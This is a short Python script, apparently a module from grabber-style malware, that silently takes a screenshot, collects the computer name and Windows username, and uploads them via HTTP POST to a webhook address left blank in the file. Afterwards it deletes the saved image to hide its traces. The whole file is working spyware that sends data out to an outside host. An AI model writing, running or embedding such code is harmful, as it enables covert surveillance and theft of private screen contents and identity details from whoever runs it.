import requests,os
import pyautogui

webhook = ""

def grabScreenshot(web):
    LOCAL = os.getenv("LOCALAPPDATA")

    try:
        os.remove(LOCAL + '\\screen_741_852_963.png')
    except:
        pass
    
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")

    payload = {
        "content": f"{pc_name} | {pc_username}",
        "username": f'pyautogui',
    }

    screen = pyautogui.screenshot()
    screen.save(LOCAL + '\\screen_741_852_963.png')

    file = LOCAL + "\\screen_741_852_963.png"
    with open(file, "rb") as openfile:
        multipart = {"file": (openfile.name, openfile, "application/octet-stream")}
        requests.post(url=f'{web}', files=multipart, data=payload)

    try:
        os.remove(LOCAL + '\\screen_741_852_963.png')
    except:
        pass

grabScreenshot(webhook)